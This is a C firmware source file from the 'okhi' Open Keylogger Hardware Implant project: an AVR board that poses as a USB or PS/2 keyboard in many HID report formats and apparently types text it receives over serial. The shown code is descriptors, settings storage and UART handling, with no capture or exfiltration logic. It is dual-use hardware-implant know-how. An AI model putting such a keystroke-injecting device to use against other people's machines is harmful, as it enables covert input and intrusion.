/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#include <avr/io.h>
#include <avr/interrupt.h>
#include <avr/pgmspace.h>
#include <avr/wdt.h>
#include <avr/eeprom.h>
#include <util/delay.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define FW_NAME     "okhi-kbd-avr"
#define FW_VERSION  "4.2"

#define UART_BAUD   9600UL

#ifndef BOARD_LEONARDO
#define BOARD_LEONARDO 0
#endif

/* A Pro Micro does not break out PC7, so the Leonardo's pin-13 "L" LED simply does not exist on it
   and every visual diagnostic was dead. Its own RX LED is on PB0, wired to VCC through a resistor,
   so it lights when the pin is driven LOW, the opposite of PC7. LED_ACTIVE_LOW carries that.
   Build for a Leonardo with -DBOARD_LEONARDO=1. */
#if BOARD_LEONARDO
#define BOARD_NAME  "leonardo"
#define LED_DDR     DDRC
#define LED_PORT    PORTC
#define LED_BIT     PC7
#define LED_ACTIVE_LOW 0
#define LED_NAME    "13/PC7"
#define BUSY_NAME   "12/PD6"
#else
#define BOARD_NAME  "promicro"
#define LED_DDR     DDRB
#define LED_PORT    PORTB
#define LED_BIT     PB0
#define LED_ACTIVE_LOW 1
#define LED_NAME    "RX/PB0"
#define BUSY_NAME   "PD6/nc"
#endif

/* PD6 is not broken out on a Pro Micro, so BUSY is driven but unreachable there. Left in place so
   the two boards run the same code path. */
#define BUSY_DDR    DDRD
#define BUSY_PORT   PORTD
#define BUSY_BIT    PD6

#define USB_VID     0x2341
#define USB_PID     0x8036
/* The Leonardo VID:PID makes Windows bind interface 0 of a COMPOSITE device to the Arduino CDC
   serial INF (hijacking it as a broken COM port). The two-interface formats present a different
   PID so Windows falls back to the generic HID class driver and both interfaces are keyboards. */
#define USB_PID_COMPOSITE 0xFEED

#ifndef USB_LOW_SPEED
#define USB_LOW_SPEED 0
#endif
#ifndef FORCE_SPEED
#define FORCE_SPEED 0
#endif

#define LAYOUT_ES 0
#define LAYOUT_US 1
#define LAYOUT_MAX 1

/* Everything persisted lives in one EEPROM image at address 0, never in loose cells: magic and
   version identify it, a checksum over the rest rejects a half-written or corrupt one, and any
   of those failing falls the whole board back to the compiled defaults.
   It is a plain mirror: every command that changes a setting edits this struct and writes the
   whole of it back, and the board reads the whole of it once at boot. No offsets anywhere. */
#define EE_SETTINGS_ADDR  0
#define SETTINGS_MAGIC    0x4B48
#define SETTINGS_VERSION  1

struct Settings {
  uint16_t magic;
  uint8_t version;
  uint8_t lowSpeed;
  uint8_t kro;
  uint8_t poll;
  uint8_t layout;
  uint16_t pressMs;
  uint16_t gapMs;
  uint16_t settleMs;
  uint16_t deadMs;
  uint16_t jitterMs;
  uint8_t echo;
  uint8_t guard;
  uint8_t capsFix;
  uint8_t crc;
};

/* Report formats this device can present, to exercise every driver code path.
   (Format 7, sub-ms polling at high speed, is impossible on a full-speed-only AVR.) */
#define KRO_BOOT     0   /* formats 1/2: 8-byte boot layout, 6-key array, no report ID   */
#define KRO_NKRO     1   /* format 5:    modifier + key bitmap, full N-key rollover      */
#define KRO_ARRAY    2   /* format 3:    extended array, up to ARRAY_KEYS slots          */
#define KRO_MULTI    3   /* format 4:    several 6-key reports on report IDs             */
#define KRO_HYBRID   4   /* format 6:    one interface, report IDs (6-key ID1 + NKRO ID6)*/
#define KRO_HYBRID2  5   /* format 6:    two interfaces (boot IF0 + NKRO IF1)            */
#define KRO_CONSUMER 6   /* boot keyboard + Consumer Page control report (media keys)    */
#define KRO_LSMULTI  7   /* format 4 low speed: two 6-key interfaces, no IDs (8 B each)  */
#define KRO_LSCONS   8   /* K120 low speed: boot IF0 + consumer IF1, no IDs (8 B each)   */
#define KRO_MAX      8

/* NKRO input report: 1 modifier byte + a key bitmap covering usages 0x00..NKRO_USAGE_MAX.
   Reports larger than 8 bytes cannot ride a low-speed packet, so any format wider than the
   boot layout implies full speed and a larger interrupt IN endpoint. */
#define NKRO_USAGE_MAX 0x77
#define NKRO_BYTES     15               /* (NKRO_USAGE_MAX + 1) / 8 = 120 / 8 */
#define NKRO_REPORT_LEN (1 + NKRO_BYTES)
#define EP1_SIZE_NKRO  16

#define ARRAY_KEYS 16                   /* format 3 extended array slot count */
#define REPORT_MAX (2 + ARRAY_KEYS)     /* largest interrupt-IN report we build (18 bytes) */
#define MULTI_IDS  2                    /* format 4: number of 6-key reports (IDs 1..N) */
#define KID_KBD    1                    /* report ID of the 6-key report (formats 4/6) */
#define KID_NKRO   6                    /* report ID of the NKRO report (format 6)     */
#define KID_CONS   2                    /* report ID of the consumer report            */

/* EEPROM byte 2: persisted interrupt-IN bInterval (ms). Full speed: 1 = 1000 Hz, 2 = 500,
   4 = 250, 8 = 125. Low speed is clamped to >= 10 (spec floor). Stored value 1..64 is used,
   anything else (fresh 0xFF) falls back to the default. */
#define DEF_POLL 10

#ifndef EP0_SIZE
#define EP0_SIZE 8
#endif
#ifndef USB_BCD
#define USB_BCD 0x0110
#endif
#ifndef USB_POWER_MA
#define USB_POWER_MA 100
#endif
#ifndef EP1_INTERVAL
#define EP1_INTERVAL 10
#endif
#ifndef USB_USE_STRINGS
#define USB_USE_STRINGS 1
#endif

#define EP1_SIZE 8

#define KB_REPORT_LEN 8
#define KB_ROLLOVER   6
#define KB_LED_CAPS   0x02

#define MOD_LCTRL  0x01
#define MOD_LSHIFT 0x02
#define MOD_LALT   0x04
#define MOD_LGUI   0x08
#define MOD_RCTRL  0x10
#define MOD_RSHIFT 0x20
#define MOD_RALT   0x40
#define MOD_RGUI   0x80
#define MOD_NONE   0x00
#define MOD_CTRL   MOD_LCTRL
#define MOD_SHIFT  MOD_LSHIFT
#define MOD_ALT    MOD_LALT
#define MOD_GUI    MOD_LGUI
#define MOD_ALTGR  MOD_RALT

#define K_ENTER  0x28
#define K_ESC    0x29
#define K_BSPACE 0x2A
#define K_TAB    0x2B
#define K_SPACE  0x2C

#define DEAD_GRAVE 0x2F
#define DEAD_ACUTE 0x34
#define DEAD_TILDE 0x21

#define LINE_MAX      200
#define RX_RING_SIZE  256
#define RX_RING_MASK  (RX_RING_SIZE - 1)

#define CH_XON    0x11
#define CH_XOFF   0x13
#define CH_ABORT  0x03
#define CH_CANCEL 0x18

#define DEF_PRESS_MS  30
#define DEF_GAP_MS    30
#define DEF_SETTLE_MS 50
#define DEF_DEAD_MS   40
#define DEF_JITTER_MS 5
#define MAX_TIMING_MS 1000
#define MAX_DELAY_MS  60000UL
#define MAX_REPEAT    200

#define HOLD_TIMEOUT_MS  30000UL
#define WARMUP_IDLE_MS   250UL
#define USB_WAIT_MS      1500UL
#define BANNER_PERIOD_MS 3000UL
#define BANNER_REPEATS   40
#define BLINK_SLOW_MS    500UL
#define BLINK_FAST_MS    100UL
#define RX_FLASH_MS      2000UL
#define BLINK_RX_MS      60UL

static volatile uint32_t g_ms = 0;

ISR(TIMER0_COMPA_vect) { g_ms++; }

static uint32_t millis(void) {
  uint32_t m;
  uint8_t s = SREG;
  cli();
  m = g_ms;
  SREG = s;
  return m;
}

static void timer_init(void) {
  TCCR0A = (1 << WGM01);
  TCCR0B = (1 << CS01) | (1 << CS00);
  OCR0A = 249;
  TIMSK0 = (1 << OCIE0A);
}

static volatile uint8_t  g_rxBuf[RX_RING_SIZE];
static volatile uint16_t g_rxHead = 0;
static volatile uint16_t g_rxTail = 0;
static volatile uint8_t  g_abort = 0;
static volatile uint32_t g_rxDropped = 0;
static uint8_t g_rxSeen = 0;

static volatile uint8_t g_rxActivity = 0;

ISR(USART1_RX_vect) {
  uint8_t b = UDR1;
  g_rxActivity = 1;
  if (b == CH_ABORT || b == CH_CANCEL) { g_abort = 1; return; }
  if (b == CH_XON || b == CH_XOFF) return;
  uint16_t next = (uint16_t)((g_rxHead + 1) & RX_RING_MASK);
  if (next == g_rxTail) { g_rxDropped++; return; }
  g_rxBuf[g_rxHead] = b;
  g_rxHead = next;
}

static void uart_init(uint32_t baud) {
  uint16_t ubrr = (uint16_t)((F_CPU + 8UL * baud) / (16UL * baud) - 1UL);
  UBRR1H = (uint8_t)(ubrr >> 8);
  UBRR1L = (uint8_t)ubrr;
  UCSR1A = 0;
  UCSR1C = (1 << UCSZ11) | (1 << UCSZ10);
  UCSR1B = (1 << RXEN1) | (1 << TXEN1) | (1 << RXCIE1);
}

static void uart_putc(char c) {
  while (!(UCSR1A & (1 << UDRE1))) { }
  UDR1 = (uint8_t)c;
}

static void uart_flush(void) {
  while (!(UCSR1A & (1 << TXC1)) && !(UCSR1A & (1 << UDRE1))) { }
  _delay_ms(2);
}

static int rx_pop(void) {
  if (g_rxHead == g_rxTail) return -1;
  uint8_t b = g_rxBuf[g_rxTail];
  g_rxTail = (uint16_t)((g_rxTail + 1) & RX_RING_MASK);
  return (int)b;
}

static void rx_clear(void) { g_rxTail = g_rxHead; }

static void outStr(const char *s) { while (*s) uart_putc(*s++); }
static void outP(const char *p) {
  char c;
  while ((c = (char)pgm_read_byte(p++)) != '\0') uart_putc(c);
}
#define OUTP(lit) outP(PSTR(lit))
static void outEol(void) { uart_putc('\r'); uart_putc('\n'); }
static void outU32(uint32_t v) { char b[12]; ultoa(v, b, 10); outStr(b); }
static void outHex8(uint8_t v) {
  char b[4];
  utoa(v, b, 16);
  if (v < 16) uart_putc('0');
  outStr(b);
}
static void outOk(void) { OUTP("OK"); outEol(); }
static void outOnOff(uint8_t v) { if (v) OUTP("ON"); else OUTP("OFF"); }

static uint32_t g_statErrors = 0;
static void outErrP(const char *p) { g_statErrors++; OUTP("ERR "); outP(p); outEol(); }
#define ERRP(lit) outErrP(PSTR(lit))

static const uint8_t PROGMEM device_descriptor[] = {
  18, 1,
  (uint8_t)(USB_BCD & 0xFF), (uint8_t)(USB_BCD >> 8),
  0, 0, 0,
  EP0_SIZE,
  (uint8_t)(USB_VID & 0xFF), (uint8_t)(USB_VID >> 8),
  (uint8_t)(USB_PID & 0xFF), (uint8_t)(USB_PID >> 8),
  0x00, 0x01,
#if USB_USE_STRINGS
  1, 2, 0,
#else
  0, 0, 0,
#endif
  1
};

static const uint8_t PROGMEM hid_report_descriptor[] = {
  0x05, 0x01,
  0x09, 0x06,
  0xA1, 0x01,
  0x05, 0x07,
  0x19, 0xE0,
  0x29, 0xE7,
  0x15, 0x00,
  0x25, 0x01,
  0x75, 0x01,
  0x95, 0x08,
  0x81, 0x02,
  0x95, 0x01,
  0x75, 0x08,
  0x81, 0x03,
  0x95, 0x05,
  0x75, 0x01,
  0x05, 0x08,
  0x19, 0x01,
  0x29, 0x05,
  0x91, 0x02,
  0x95, 0x01,
  0x75, 0x03,
  0x91, 0x03,
  0x95, 0x06,
  0x75, 0x08,
  0x15, 0x00,
  0x25, 0x65,
  0x05, 0x07,
  0x19, 0x00,
  0x29, 0x65,
  0x81, 0x00,
  0xC0
};

/* NKRO bitmap (format 5), no report ID: modifier byte + 120-bit key bitmap.
   Input report = 1 + NKRO_BYTES = 16 bytes. LEDs stay a 1-byte Output report. */
static const uint8_t PROGMEM hid_report_descriptor_nkro[] = {
  0x05, 0x01,
  0x09, 0x06,
  0xA1, 0x01,
  0x05, 0x07,
  0x19, 0xE0,
  0x29, 0xE7,
  0x15, 0x00,
  0x25, 0x01,
  0x75, 0x01,
  0x95, 0x08,
  0x81, 0x02,
  0x05, 0x08,
  0x19, 0x01,
  0x29, 0x05,
  0x95, 0x05,
  0x75, 0x01,
  0x91, 0x02,
  0x95, 0x01,
  0x75, 0x03,
  0x91, 0x01,
  0x05, 0x07,
  0x19, 0x00,
  0x29, NKRO_USAGE_MAX,
  0x15, 0x00,
  0x25, 0x01,
  0x75, 0x01,
  0x95, (NKRO_BYTES * 8),
  0x81, 0x02,
  0xC0
};

/* Format 3: extended array, ARRAY_KEYS slots, no report ID. Report = 2 + ARRAY_KEYS bytes. */
static const uint8_t PROGMEM hid_report_descriptor_array[] = {
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
  0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
  0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
  0x95, ARRAY_KEYS, 0x75, 0x08, 0x15, 0x00, 0x25, 0xA4, 0x05, 0x07, 0x19, 0x00, 0x29, 0xA4, 0x81, 0x00,
  0xC0
};

/* Format 4: two 6-key reports on report IDs 1 and 2. Each report = 1 + 8 bytes. */
static const uint8_t PROGMEM hid_report_descriptor_multi[] = {
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
  0x85, KID_KBD,
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
  0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
  0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
  0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0xA4, 0x05, 0x07, 0x19, 0x00, 0x29, 0xA4, 0x81, 0x00,
  0x85, (KID_KBD + 1),
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
  0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0xA4, 0x05, 0x07, 0x19, 0x00, 0x29, 0xA4, 0x81, 0x00,
  0xC0
};

/* Format 6 (single interface, report IDs): ID1 = 6-key boot-style + LED, ID6 = NKRO bitmap. */
static const uint8_t PROGMEM hid_report_descriptor_hybrid[] = {
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
  0x85, KID_KBD,
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
  0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
  0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
  0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0xA4, 0x05, 0x07, 0x19, 0x00, 0x29, 0xA4, 0x81, 0x00,
  0x85, KID_NKRO,
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x05, 0x07, 0x19, 0x00, 0x29, NKRO_USAGE_MAX, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, (NKRO_BYTES * 8), 0x81, 0x02,
  0xC0
};

/* Consumer variant: keyboard (ID1, boot-style 6-key + LED) plus a Consumer Control
   collection (ID2, one 16-bit usage) for media keys. */
static const uint8_t PROGMEM hid_report_descriptor_consumer[] = {
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
  0x85, KID_KBD,
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
  0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
  0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
  0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0xA4, 0x05, 0x07, 0x19, 0x00, 0x29, 0xA4, 0x81, 0x00,
  0xC0,
  0x05, 0x0C, 0x09, 0x01, 0xA1, 0x01,
  0x85, KID_CONS,
  0x15, 0x00, 0x26, 0xFF, 0x03, 0x19, 0x00, 0x2A, 0xFF, 0x03, 0x75, 0x10, 0x95, 0x01, 0x81, 0x00,
  0xC0
};

/* Consumer Control only, no report ID (2-byte report). Used on IF1 of KRO_LSCONS. */
static const uint8_t PROGMEM hid_report_descriptor_cons_only[] = {
  0x05, 0x0C, 0x09, 0x01, 0xA1, 0x01,
  0x15, 0x00, 0x26, 0xFF, 0x03, 0x19, 0x00, 0x2A, 0xFF, 0x03, 0x75, 0x10, 0x95, 0x01, 0x81, 0x00,
  0xC0
};

#define CONFIG_DESC_LEN 34

static const uint8_t PROGMEM config_descriptor[CONFIG_DESC_LEN] = {
  9, 2,
  CONFIG_DESC_LEN, 0,
  1, 1, 0,
  0xA0,
  (USB_POWER_MA / 2),

  9, 4,
  0, 0, 1,
  0x03, 0x01, 0x01,
  0,

  9, 0x21,
  0x11, 0x01,
  0x00,
  1,
  0x22,
  sizeof(hid_report_descriptor), 0,

  7, 5,
  0x81,
  0x03,
  EP1_SIZE, 0,
  EP1_INTERVAL
};

/* Two-interface config for KRO_HYBRID2 (format 6, K63 style): IF0 boot 6KRO on EP1 (8 B),
   IF1 non-boot NKRO keyboard on EP2 (16 B). */
#define CONFIG2_LEN 59
#define CONFIG2_HID0_OFF 18
#define CONFIG2_HID1_OFF 43
static const uint8_t PROGMEM config_descriptor2[CONFIG2_LEN] = {
  9, 2, CONFIG2_LEN, 0, 2, 1, 0, 0xA0, (USB_POWER_MA / 2),
  /* IF0: boot keyboard */
  9, 4, 0, 0, 1, 0x03, 0x01, 0x01, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor), 0,
  7, 5, 0x81, 0x03, 8, 0, EP1_INTERVAL,
  /* IF1: non-boot NKRO keyboard */
  9, 4, 1, 0, 1, 0x03, 0x00, 0x00, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor_nkro), 0,
  7, 5, 0x82, 0x03, EP1_SIZE_NKRO, 0, 1
};

/* KRO_LSMULTI (format 4, low speed): two 6-key boot interfaces, EP1/EP2 8 B, no report IDs. */
static const uint8_t PROGMEM config_descriptor_lsmulti[CONFIG2_LEN] = {
  9, 2, CONFIG2_LEN, 0, 2, 1, 0, 0xA0, (USB_POWER_MA / 2),
  9, 4, 0, 0, 1, 0x03, 0x01, 0x01, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor), 0,
  7, 5, 0x81, 0x03, 8, 0, EP1_INTERVAL,
  9, 4, 1, 0, 1, 0x03, 0x00, 0x00, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor), 0,
  7, 5, 0x82, 0x03, 8, 0, EP1_INTERVAL
};

/* KRO_LSCONS (K120, low speed): IF0 boot keyboard, IF1 consumer control, EP1/EP2 8 B, no IDs. */
static const uint8_t PROGMEM config_descriptor_lscons[CONFIG2_LEN] = {
  9, 2, CONFIG2_LEN, 0, 2, 1, 0, 0xA0, (USB_POWER_MA / 2),
  9, 4, 0, 0, 1, 0x03, 0x01, 0x01, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor), 0,
  7, 5, 0x81, 0x03, 8, 0, EP1_INTERVAL,
  9, 4, 1, 0, 1, 0x03, 0x00, 0x00, 0,
  9, 0x21, 0x11, 0x01, 0x00, 1, 0x22, sizeof(hid_report_descriptor_cons_only), 0,
  7, 5, 0x82, 0x03, 8, 0, EP1_INTERVAL
};

#if USB_USE_STRINGS
static const uint8_t PROGMEM string0[] = { 4, 3, 0x09, 0x04 };
static const uint8_t PROGMEM string1[] = {
  16, 3, 'o',0, 'k',0, 'h',0, 'i',0, ' ',0, 'l',0, 'a',0
};
static const uint8_t PROGMEM string2[] = {
  18, 3, 'k',0, 'e',0, 'y',0, 'b',0, 'o',0, 'a',0, 'r',0, 'd',0
};
#endif

static volatile uint8_t usb_configuration = 0;
static volatile uint8_t usb_suspended = 0;
static volatile uint8_t hid_protocol = 1;
static volatile uint8_t hid_idle = 0;
static volatile uint8_t hid_leds = 0;

static volatile uint16_t dbg_resets = 0;
static volatile uint16_t dbg_setups = 0;
static volatile uint16_t dbg_getdesc = 0;
static volatile uint8_t  dbg_last_req = 0xFF;
static volatile uint8_t  dbg_last_reqtype = 0xFF;
static volatile uint8_t  dbg_last_desc = 0xFF;
static volatile uint8_t  dbg_setaddr = 0;
static volatile uint8_t  dbg_setconfig = 0;
static volatile uint8_t  dbg_stalls = 0;
static volatile uint16_t dbg_sof = 0;
static volatile uint8_t  dbg_udint_seen = 0;
static volatile uint16_t dbg_vbus_changes = 0;
static volatile uint32_t dbg_vbus_last_ms = 0;
static volatile uint8_t  dbg_suspends = 0;
static volatile uint8_t  dbg_wakeups = 0;

static uint8_t kb_report[KB_REPORT_LEN];
static uint32_t g_reportsOk = 0;
static uint32_t g_reportsFail = 0;

/* The one live value that is deliberately not the configured one: a wide report format cannot
   fit a low-speed packet, so it forces full speed while g_cfg.lowSpeed keeps what was asked for. */
static volatile uint8_t g_lowSpeed = USB_LOW_SPEED;
static uint8_t nkro_map[NKRO_BYTES];
static uint16_t g_consumer = 0;

/* The live configuration. Nothing shadows it: every command reads and writes these fields and
   then calls settings_store(), so RAM and EEPROM never disagree. */
static struct Settings g_cfg;

static uint8_t settings_crc(const struct Settings *s) {
  const uint8_t *p = (const uint8_t *)s;
  uint8_t c = 0;
  for (uint8_t i = 0; i < (uint8_t)(sizeof(*s) - 1); i++) c = (uint8_t)(c + p[i]);
  return (uint8_t)(c ^ 0xA5);
}

static void settings_defaults(struct Settings *s) {
  s->magic = SETTINGS_MAGIC;
  s->version = SETTINGS_VERSION;
  s->lowSpeed = USB_LOW_SPEED;
  s->kro = KRO_BOOT;
  s->poll = DEF_POLL;
  s->layout = LAYOUT_ES;
  s->pressMs = DEF_PRESS_MS;
  s->gapMs = DEF_GAP_MS;
  s->settleMs = DEF_SETTLE_MS;
  s->deadMs = DEF_DEAD_MS;
  s->jitterMs = DEF_JITTER_MS;
  s->echo = 1;
  s->guard = 1;
  s->capsFix = 1;
  s->crc = settings_crc(s);
}

static uint8_t settings_valid(const struct Settings *s) {
  if (s->magic != SETTINGS_MAGIC || s->version != SETTINGS_VERSION) return 0;
  if (s->crc != settings_crc(s)) return 0;
  if (s->kro > KRO_MAX || s->layout > LAYOUT_MAX) return 0;
  if (s->poll < 1 || s->poll > 64) return 0;
  if (s->pressMs > MAX_TIMING_MS || s->gapMs > MAX_TIMING_MS) return 0;
  if (s->settleMs > MAX_TIMING_MS || s->deadMs > MAX_TIMING_MS) return 0;
  if (s->jitterMs > MAX_TIMING_MS) return 0;
  if (s->echo > 1 || s->guard > 1 || s->capsFix > 1) return 0;
  return 1;
}

static void settings_load(void) {
  eeprom_read_block(&g_cfg, (const void *)EE_SETTINGS_ADDR, sizeof(g_cfg));
  if (!settings_valid(&g_cfg)) settings_defaults(&g_cfg);
}

/* eeprom_update_block only burns the cells that actually differ, so writing the whole image on
   every SPEED or KRO change costs the endurance of the bytes that moved and nothing more. */
static void settings_store(void) {
  g_cfg.crc = settings_crc(&g_cfg);
  eeprom_update_block(&g_cfg, (void *)EE_SETTINGS_ADDR, sizeof(g_cfg));
}

/* Leave the cells erased rather than writing a defaults image, so a factory-reset board and a
   freshly flashed one are byte for byte the same. */
static void settings_erase(void) {
  for (uint16_t i = 0; i < (uint16_t)sizeof(g_cfg); i++) {
    eeprom_update_byte((uint8_t *)(i + EE_SETTINGS_ADDR), 0xFF);
  }
  settings_defaults(&g_cfg);
}

/* Effective bInterval for the endpoint descriptor: a low-speed interrupt endpoint must be
   at least 10 ms per spec, so clamp there; full speed honours 1..255 verbatim. */
static uint8_t poll_bInterval(void) {
  if (g_lowSpeed && g_cfg.poll < 10) return 10;
  return g_cfg.poll;
}

/* Report descriptor for the active format (interface 0 for the two-interface variant). */
static const uint8_t *fmt_rdesc(uint16_t *len) {
  switch (g_cfg.kro) {
    case KRO_NKRO:     *len = sizeof(hid_report_descriptor_nkro);     return hid_report_descriptor_nkro;
    case KRO_ARRAY:    *len = sizeof(hid_report_descriptor_array);    return hid_report_descriptor_array;
    case KRO_MULTI:    *len = sizeof(hid_report_descriptor_multi);    return hid_report_descriptor_multi;
    case KRO_HYBRID:   *len = sizeof(hid_report_descriptor_hybrid);   return hid_report_descriptor_hybrid;
    case KRO_CONSUMER: *len = sizeof(hid_report_descriptor_consumer); return hid_report_descriptor_consumer;
    default:           *len = sizeof(hid_report_descriptor);          return hid_report_descriptor;
  }
}

static uint8_t fmt_ep1_size(void) {
  switch (g_cfg.kro) {
    case KRO_NKRO:     return 16;
    case KRO_ARRAY:    return 32;
    case KRO_MULTI:    return 16;
    case KRO_HYBRID:   return 32;
    case KRO_CONSUMER: return 16;
    default:           return EP1_SIZE;   /* 8 */
  }
}

static uint8_t fmt_epsize_bits(void) {
  switch (fmt_ep1_size()) {
    case 16: return (1 << EPSIZE0);
    case 32: return (2 << EPSIZE0);
    case 64: return (3 << EPSIZE0);
    default: return (0 << EPSIZE0);
  }
}

static uint8_t fmt_full_speed(void) { return (uint8_t)(g_cfg.kro == KRO_HYBRID2 || fmt_ep1_size() > 8); }

/* Two-interface formats (HYBRID2 full speed, LSMULTI/LSCONS low-speed capable, all 2 interfaces). */
static uint8_t fmt_two_if(void) {
  return (uint8_t)(g_cfg.kro == KRO_HYBRID2 || g_cfg.kro == KRO_LSMULTI || g_cfg.kro == KRO_LSCONS);
}
static const uint8_t *twoif_config(void) {
  if (g_cfg.kro == KRO_LSMULTI) return config_descriptor_lsmulti;
  if (g_cfg.kro == KRO_LSCONS)  return config_descriptor_lscons;
  return config_descriptor2;
}
static const uint8_t *twoif_rdesc(uint8_t iface, uint16_t *len) {
  if (iface == 0) { *len = sizeof(hid_report_descriptor); return hid_report_descriptor; }
  if (g_cfg.kro == KRO_HYBRID2) { *len = sizeof(hid_report_descriptor_nkro); return hid_report_descriptor_nkro; }
  if (g_cfg.kro == KRO_LSMULTI) { *len = sizeof(hid_report_descriptor); return hid_report_descriptor; }
  *len = sizeof(hid_report_descriptor_cons_only); return hid_report_descriptor_cons_only;
}
static uint8_t twoif_ep2_epsize_bits(void) {
  return (g_cfg.kro == KRO_HYBRID2) ? (1 << EPSIZE0) : (0 << EPSIZE0);
}

/* Fill up to `slots` held key usages (from the bitmap) into buf, return the count. */
static uint8_t fill_array(uint8_t *buf, uint8_t slots) {
  uint8_t n = 0;
  for (uint16_t u = 0; u <= NKRO_USAGE_MAX && n < slots; u++) {
    if (nkro_map[u >> 3] & (uint8_t)(1u << (u & 7))) buf[n++] = (uint8_t)u;
  }
  return n;
}
static uint8_t  g_hunt = 0;
static uint8_t  g_huntStep = 0;
static uint16_t g_huntRound = 0;
static uint32_t g_huntAt = 0;

#define MODE_PROBE 0
#define MODE_USB   1
#define MODE_PS2   2

#define PIN_AUTO 0
#define PIN_USB  1
#define PIN_PS2  2

#define PROBE_VBUS_MS     2500UL
#define PROBE_NOVBUS_MS   300UL
#define PROBE_PULLUP_MS   800UL
#define PROBE_LINE_AT_MS  60UL
#define USB_LOST_MS       1500UL

#define PS2_CLK_DDR  DDRE
#define PS2_CLK_PORT PORTE
#define PS2_CLK_PIN  PINE
#define PS2_CLK_BIT  PE6

#define PS2_DAT_DDR  DDRD
#define PS2_DAT_PORT PORTD
#define PS2_DAT_PIN  PIND
#define PS2_DAT_BIT  PD7

#define PS2_T_SETUP_US 15
#define PS2_T_LOW_US   40
#define PS2_T_HIGH_US  40
#define PS2_T_BYTE_US  60
#define PS2_T_SAMPLE_US 20

#define PS2_TX_SIZE 128
#define PS2_TX_MASK (PS2_TX_SIZE - 1)
#define PS2_RSP_SIZE 8
#define PS2_RSP_MASK (PS2_RSP_SIZE - 1)

#define PS2_ACK      0xFA
#define PS2_BAT_OK   0xAA
#define PS2_ECHO_RSP 0xEE
#define PS2_ERR_RSP  0xFE

#define PS2_ARG_NONE 0
#define PS2_ARG_LEDS 1
#define PS2_ARG_SET  2
#define PS2_ARG_ANY  3

#define PS2_LED_SCROLL 0x01
#define PS2_LED_NUM    0x02
#define PS2_LED_CAPS   0x04

#define HID_LED_NUM    0x01
#define HID_LED_SCROLL 0x04

#define KEY_PRINTSCREEN 0x46
#define KEY_PAUSE       0x48

static volatile uint8_t g_mode = MODE_PROBE;
static uint8_t  g_modePin = PIN_AUTO;
static uint32_t g_probeStart = 0;
static uint8_t  g_probeDone = 0;
